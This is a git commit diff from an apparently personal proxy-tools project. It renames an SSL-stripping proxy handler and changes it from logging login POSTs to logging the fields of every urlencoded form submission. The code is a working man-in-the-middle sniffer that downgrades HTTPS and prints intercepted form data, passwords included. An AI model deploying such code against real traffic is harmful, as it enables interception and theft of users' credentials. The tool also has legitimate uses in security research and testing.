1131bc16e3d91f4132a2001646c631cb87629aa6
inaz2 <inaz2@twitter>
2013-11-12 15:22:13 +0900

    rename SSLSniffPasswordProxy -> SSLStripSniffProxy and make it sniff all urlencoded posts

--- SSLStripSniffProxy.py
+++ SSLStripSniffProxy.py
@@ -3,15 +3,15 @@
 from SSLStripProxy import SSLStripProxyHandler, test
 import urlparse
 
-class SSLSniffPasswordProxyHandler(SSLStripProxyHandler):
+class SSLStripSniffProxyHandler(SSLStripProxyHandler):
     def request_handler(self, req, body):
         SSLStripProxyHandler.request_handler(self, req, body)
 
-        if req.command == 'POST' and 'login' in req.path.lower():
+        if req.command == 'POST' and req.headers.get('Content-Type').startswith('application/x-www-form-urlencoded'):
             print req.path
             for k, v in urlparse.parse_qsl(body):
                 print "  %s: %s" % (k, v)
 
 
 if __name__ == '__main__':
-    test(HandlerClass=SSLSniffPasswordProxyHandler)
+    test(HandlerClass=SSLStripSniffProxyHandler)
